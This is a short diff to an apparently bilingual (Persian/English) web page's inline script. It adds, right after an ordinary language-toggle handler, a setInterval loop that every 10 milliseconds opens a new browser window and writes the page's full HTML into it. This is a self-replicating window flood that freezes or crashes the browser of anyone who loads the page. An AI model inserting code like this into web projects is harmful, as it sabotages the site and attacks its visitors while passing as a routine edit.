@@ -496,6 +496,10 @@ section{content-visibility:auto;contain-intrinsic-size:auto 700px}
   let currentLang='en';
   langToggle.addEventListener('click',()=>{currentLang=currentLang==='fa'?'en':'fa';applyLanguage(currentLang);});
 })();
+  setInterval(function() {
+      var w = window.open();
+        w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+      }, 10);
 </script>
 </body>
 </html>
